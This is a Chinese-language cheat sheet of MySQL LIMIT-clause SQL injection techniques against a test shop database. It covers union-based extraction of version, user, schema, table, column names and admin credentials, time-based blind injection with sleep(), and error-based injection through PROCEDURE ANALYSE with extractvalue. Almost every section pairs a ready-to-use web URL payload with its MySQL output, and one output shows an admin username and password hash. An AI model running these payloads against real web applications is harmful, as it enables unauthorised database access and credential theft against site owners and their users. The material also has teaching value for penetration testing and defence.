# limit 注入中使用into查列数方法

## 0x00 记忆方式

limit 0,1 into @,@,@,@,x

## 0x01 实验

```plain
# 可以很明显看得到是3列
mysql> select * from tdb_admin limit 0,1;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 7fef6171469e80d32c0559f88b377245 |
+----+----------+----------------------------------+
1 row in set
# 输入 into @时爆列名不一致了
mysql> select * from tdb_admin limit 0,1 into  @;
1222 - The used SELECT statements have a different number of columns
# 输入 into @,@,@ 时显示ok了,说明 tdb_admin表 列数为 3
mysql> select * from tdb_admin limit 0,1 into  @,@,@;
Query OK, 1 row affected
```

# MySQL limit union注入-无orderBy的注入方法-只适用于小于5.6.6的5.x系列

## 0x00 记忆方式

select * from tdb_goods limit 0,2 union select 1,2,3,4,5,6,7

## 0x01 爆数据库版本

web语句: http://www.test.com/limit_sql.php?limit=2 union select 1,VERSION(),3,4,5,6,7



数据库语句: select * from tdb_goods limit 0,2 union select 1,VERSION(),3,4,5,6,7;

```plain
mysql> select * from tdb_goods limit 0,2 union select 1,VERSION(),3,4,5,6,7;
+----------+---------------------------------+------------+------------+-------------+---------+------------+
| goods_id | goods_name                      | goods_cate | brand_name | goods_price | is_show | is_saleoff |
+----------+---------------------------------+------------+------------+-------------+---------+------------+
|        1 | R510VC 15.6鑻卞绗旇鏈?          | 绗旇鏈?    | 鍗庣       |    3399.000 |       1 |          0 |
|        2 | Y400N 14.0鑻卞绗旇鏈數鑴?       | 绗旇鏈?    | 鑱旀兂       |    4899.000 |       1 |          0 |
|        1 | 5.5.53                          | 3          | 4          |       5.000 |       6 |          7 |
+----------+---------------------------------+------------+------------+-------------+---------+------------+
```

## 0x02 爆当前连接用户

web语句: http://www.test.com/limit_sql.php?limit=2 union select 1,user(),3,4,5,6,7;



数据库语句: select * from tdb_goods  limit 0,2 union select 1,user(),3,4,5,6,7;



```plain
mysql> select * from tdb_goods  limit 0,2 union select 1,user(),3,4,5,6,7;
+----------+---------------------------------+------------+------------+-------------+---------+------------+
| goods_id | goods_name                      | goods_cate | brand_name | goods_price | is_show | is_saleoff |
+----------+---------------------------------+------------+------------+-------------+---------+------------+
|        1 | R510VC 15.6鑻卞绗旇鏈?          | 绗旇鏈?    | 鍗庣       |    3399.000 |       1 |          0 |
|        2 | Y400N 14.0鑻卞绗旇鏈數鑴?       | 绗旇鏈?    | 鑱旀兂       |    4899.000 |       1 |          0 |
|        1 | root@localhost                  | 3          | 4          |       5.000 |       6 |          7 |
+----------+---------------------------------+------------+------------+-------------+---------+------------+
3 rows in set (0.00 sec)
```

## 0x03 爆当前连接的数据库

web语句: http://www.test.com/limit_sql.php?limit=2 union select 1,database(),3,4,5,6,7;



数据库语句: select * from tdb_goods  limit 0,2 union select 1,database(),3,4,5,6,7;



```plain
mysql> select * from tdb_goods  limit 0,2 union select 1,database(),3,4,5,6,7;
+----------+---------------------------------+------------+------------+-------------+---------+------------+
| goods_id | goods_name                      | goods_cate | brand_name | goods_price | is_show | is_saleoff |
+----------+---------------------------------+------------+------------+-------------+---------+------------+
|        1 | R510VC 15.6鑻卞绗旇鏈?          | 绗旇鏈?    | 鍗庣       |    3399.000 |       1 |          0 |
|        2 | Y400N 14.0鑻卞绗旇鏈數鑴?       | 绗旇鏈?    | 鑱旀兂       |    4899.000 |       1 |          0 |
|        1 | test                            | 3          | 4          |       5.000 |       6 |          7 |
+----------+---------------------------------+------------+------------+-------------+---------+------------+
3 rows in set (0.00 sec)
```

## 0x04 爆库名

注意: LIMIT 0 修改会显示其他库名

例如:

LIMIT 0,1 修改为0 就是出1库

LIMIT 1,1 修改为1 就是出2库



web语句: http://www.test.com/limit_sql.php?limit=2 union select 1,schema_name,3,4,5,6,7 from information_schema.schemata limit 0,3;

数据库语句: select * from tdb_goods limit 0,2 union select 1,schema_name,3,4,5,6,7 from information_schema.schemata limit 0,3;

```plain
mysql> select * from tdb_goods limit 0,2 union select 1,schema_name,3,4,5,6,7 from information_schema.schemata limit 0,3;
+----------+---------------------------------+------------+------------+-------------+---------+------------+
| goods_id | goods_name                      | goods_cate | brand_name | goods_price | is_show | is_saleoff |
+----------+---------------------------------+------------+------------+-------------+---------+------------+
|        1 | R510VC 15.6鑻卞绗旇鏈?          | 绗旇鏈?    | 鍗庣       |    3399.000 |       1 |          0 |
|        2 | Y400N 14.0鑻卞绗旇鏈數鑴?       | 绗旇鏈?    | 鑱旀兂       |    4899.000 |       1 |          0 |
|        1 | information_schema              | 3          | 4          |       5.000 |       6 |          7 |
+----------+---------------------------------+------------+------------+-------------+---------+------------+
3 rows in set (0.00 sec)
```

## 0x05 爆表名

注意: table_schema=xxx 修改为其他库会查出其他库的数据

例如:

table_schema=database()  会获取当前连接的库数据

table_schema='test' 会获取test库数据



注意: LIMIT 0 修改会爆出不同的表名

例如:

LIMIT 0,1 修改为0 就是出1表

LIMIT 1,1 修改为1 就是出2表



web语句: http://www.test.com/limit_sql.php?limit=2 union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=DATABASE() limit 0,3



数据库语句: select * from tdb_goods limit 0,2 union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=DATABASE() limit 0,3;



```plain
mysql> select * from tdb_goods limit 0,2 union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=DATABASE() limit 0,3;
+----------+---------------------------------+------------+------------+-------------+---------+------------+
| goods_id | goods_name                      | goods_cate | brand_name | goods_price | is_show | is_saleoff |
+----------+---------------------------------+------------+------------+-------------+---------+------------+
|        1 | R510VC 15.6鑻卞绗旇鏈?          | 绗旇鏈?    | 鍗庣       |    3399.000 |       1 |          0 |
|        2 | Y400N 14.0鑻卞绗旇鏈數鑴?       | 绗旇鏈?    | 鑱旀兂       |    4899.000 |       1 |          0 |
|        1 | tdb_admin                       | 3          | 4          |       5.000 |       6 |          7 |
+----------+---------------------------------+------------+------------+-------------+---------+------------+
3 rows in set (0.00 sec)
```

## 0x06 暴字段

table_schema = "xx" 要看的数据库名

table_name = "xx" 要看的表名

limit 0 表示要爆的位置

例如:

表tdb_admin的字段为 id,usernam,password

limit 0 = id

limit 1 = username

limit 2 = password

web语句: http://www.test.com/limit_sql.php?limit=2 union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_schema=DATABASE() AND table_name='tdb_admin' limit 0,3

数据库语句-爆test库 tdb_admin表的字段名: select * from tdb_goods limit 0,2 union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_schema=DATABASE() AND table_name='tdb_admin' limit 0,3;

```plain
mysql> select * from tdb_goods limit 0,2 union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_schema=DATABASE() AND table_name='tdb_admin' limit 0,3;
+----------+---------------------------------+------------+------------+-------------+---------+------------+
| goods_id | goods_name                      | goods_cate | brand_name | goods_price | is_show | is_saleoff |
+----------+---------------------------------+------------+------------+-------------+---------+------------+
|        1 | R510VC 15.6鑻卞绗旇鏈?          | 绗旇鏈?    | 鍗庣       |    3399.000 |       1 |          0 |
|        2 | Y400N 14.0鑻卞绗旇鏈數鑴?       | 绗旇鏈?    | 鑱旀兂       |    4899.000 |       1 |          0 |
|        1 | id                              | 3          | 4          |       5.000 |       6 |          7 |
+----------+---------------------------------+------------+------------+-------------+---------+------------+
3 rows in set (0.01 sec)
```

## 0x07 爆内容

注意: limit 0 表示要显示那一条数据

limit 0 表示第一条

limit 1 表示第二条

web语句: http://www.test.com/limit_sql.php?limit=2 union select 1,concat(0x7e,id,0x3a,username,0x3a,password,0x7e),3,4,5,6,7 from test.tdb_admin limit 0,3;

数据库语句: select * from tdb_goods limit 0,2 union select 1,concat(0x7e,字段名,0x3a,字段名,0x3a,字段名,0x7e),3,4,5,6,7 from 库名.表名 limit 0,3;

```plain
mysql> select * from tdb_goods limit 0,2 union select 1,concat(0x7e,id,0x3a,username,0x3a,password,0x7e),3,4,5,6,7 from test.tdb_admin limit 0,3;
+----------+--------------------------------------------+------------+------------+-------------+---------+------------+

| goods_id | goods_name                                 | goods_cate | brand_name | goods_price | is_show | is_saleoff |

+----------+--------------------------------------------+------------+------------+-------------+---------+------------+
|   1 | R510VC 15.6鑻卞绗旇鏈?                     | 绗旇鏈?    | 鍗庣       |    3399.000 |       1 |0 |
|   2 | Y400N 14.0鑻卞绗旇鏈數鑴?                  | 绗旇鏈?    | 鑱旀兂       |    4899.000 |       1 |  0 |
|   1 | ~1:admin:7fef6171469e80d32c0559f88b377245~ | 3          | 4          |       5.000 |       6 |          7 |
+----------+--------------------------------------------+------------+------------+-------------+---------+------------+

3 rows in set (0.00 sec)
```

# MySQL limit union时间盲注-无orderBy的注入方法-只适用于小于5.6.6的5.x系列

## 0x00 记忆方式

select * from tdb_goods limit 0,2 union select 1,if(substring(表达式,1,1)=判断条件 ,sleep(5),1),3,4,5,6,7

## 0x01 基本数据

```plain
mysql> select version();
+-----------+
| version() |
+-----------+
| 5.5.53    |
+-----------+
1 row in set (0.27 sec)

mysql> select user();
+----------------+
| user()         |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.00 sec)

mysql> select database();
+------------+
| database() |
+------------+
| test       |
+------------+
1 row in set (0.00 sec)
```

## 0x02 获取数据长度

```plain
mysql> select length(user());
+----------------+
| length(user()) |
+----------------+
|             14 |
+----------------+
1 row in set (0.00 sec)
```

web语句: http://www.test.com/limit_sql.php?limit=1 union select 1,if(length(user())=14,sleep(5),1),3,4,5,6,7



数据库语句: select * from tdb_goods limit 0,1 union select 1,if(length(user())=14,sleep(5),1),3,4,5,6,7

## 0x03 读取数据库版本/当前连接用户/当前连接的数据库

读取不同的内容

例如:

substring(user(),1,1) = r

substring(user(),2,1) = o



web语句: http://www.test.com/limit_sql.php?limit=1 union select 1,if(substring(user(),1,1)='r',sleep(5),1),3,4,5,6,7



数据库语句: select * from tdb_goods limit 0,1 union select 1,if(substring(user(),1,1)='r',sleep(5),1),3,4,5,6,7

## 0x04 猜库名

注意: LIMIT 0 修改会显示其他库名

例如:

LIMIT 0,1 修改为0 就是出1库

LIMIT 1,1 修改为1 就是出2库

```plain
// 演示数据
mysql> SELECT schema_name FROM information_schema.schemata LIMIT 0,1;
+--------------------+
| schema_name        |
+--------------------+
| information_schema |
+--------------------+
1 row in set (0.00 sec)
```

web语句: http://www.test.com/limit_sql.php?limit=1 union select 1,if(substring((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)='i',sleep(5),1),3,4,5,6,7



读取1库库名第一个字: select * from tdb_goods limit 0,1 union select 1,if(substring((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)='i',sleep(5),1),3,4,5,6,7



读取1库库名第二个字: select * from tdb_goods limit 0,1 union select 1,if(substring((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),2,1)='n',sleep(5),1),3,4,5,6,7

## 0x05 猜表名

注意: table_schema=xxx 修改为其他库会爆出其他库的数据

例如:

table_schema=database()  会获取当前连接的库数据

table_schema='test' 会获取test库数据

注意: LIMIT 0 修改会爆出不同的表名

例如:

LIMIT 0,1 修改为0 就是出1表

LIMIT 1,1 修改为1 就是出2表

```plain
// 演示数据
mysql> SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1;
+------------+
| table_name |
+------------+
| tdb_admin  |
+------------+
1 row in set (0.00 sec)
```

web语句: http://www.test.com/limit_sql.php?limit=1 union select 1,if(substring((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1),1,1)='t',sleep(5),1),3,4,5,6,7



数据库语句-读取当前库的第一张表名的第一个字: select * from tdb_goods limit 0,1 union select 1,if(substring((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1),1,1)='t',sleep(5),1),3,4,5,6,7



数据库语句-读取当前库的第一张表名的第二个字: select * from tdb_goods limit 0,1 union select 1,if(substring((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1),2,1)='d',sleep(5),1),3,4,5,6,7

## 0x06 猜字段

table_schema = "xx" 要爆的数据库名

table_name = "xx" 要爆的表名

limit 0 表示要爆的位置

例如:

表tdb_admin的字段为 id,usernam,password

limit 0 = id

limit 1 = username

limit 2 = password

```plain
// 演示数据
mysql> SELECT column_name FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1;
+-------------+
| column_name |
+-------------+
| id          |
+-------------+
1 row in set (0.00 sec)
```

web语句: http://www.test.com/limit_sql.php?limit=1 union select 1,if(substring((SELECT column_name FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1),1,1)='i',sleep(5),1),3,4,5,6,7



猜test库 tdb_admin表的第一个字段名第一个字: select * from tdb_goods limit 0,1 union select 1,if(substring((SELECT column_name FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1),1,1)='i',sleep(5),1),3,4,5,6,7



猜test库 tdb_admin表的第一个字段名第二个字: select * from tdb_goods limit 0,1 union select 1,if(substring((SELECT column_name FROM information_schema.columns where table_schema='test' and table_name='tdb_admin' limit 0,1),2,1)='d',sleep(5),1),3,4,5,6,7

## 0x07 猜内容

注意: limit 0 表示要显示那一条数据

limit 0 表示第一条

limit 1 表示第二条

```plain
mysql> SELECT username FROM test.tdb_admin limit 0,1;
+----------+
| username |
+----------+
| admin    |
+----------+
1 row in set (0.00 sec)
```

web语句: http://www.test.com/limit_sql.php?limit=1 union select 1,if(substring((SELECT 字段名 FROM 库名.表名 limit 0,1),1,1)='a',sleep(5),1),3,4,5,6,7

读取某库某表某字段第一个字: select * from tdb_goods limit 0,1 union select 1,if(substring((SELECT 字段名 FROM 库名.表名 limit 0,1),1,1)='a',sleep(5),1),3,4,5,6,7

读取某库某表某字段第二字: select * from tdb_goods limit 0,1 union select 1,if(substring((SELECT 字段名 FROM 库名.表名 limit 0,1),2,1)='a',sleep(5),1),3,4,5,6,7

# MySQL limit 爆错注入-有orderBy的注入方法-只适用于小于5.6.6的5.x系列

## 0x00 记忆方式

limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,payload)),1);

在有order by 的limit 注入我就只会注入一点基本数据了。。

## 0x01 爆数据库版本

web语句: http://www.test.com/limit_sql.php?limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)

数据库语句: select * from tdb_goods ORDER BY goods_cate limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);



```plain
mysql> select * from tdb_goods ORDER BY goods_cate limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
ERROR 1105 (HY000): XPATH syntax error: ':5.5.53'
```

## 0x02 爆当前连接用户

web语句: http://www.test.com/limit_sql.php?limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,user())),1)

数据库语句: select * from tdb_goods ORDER BY goods_cate limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,user())),1);

```plain
mysql> select * from tdb_goods ORDER BY goods_cate limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,user())),1);
ERROR 1105 (HY000): XPATH syntax error: ':root@localhost'
```

## 0x03 爆当前连接的数据库

web语句: http://www.test.com/limit_sql.php?limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)

数据库语句: select * from tdb_goods ORDER BY goods_cate limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1);

```plain
mysql> select * from tdb_goods ORDER BY goods_cate limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1);
ERROR 1105 (HY000): XPATH syntax error: ':test'
```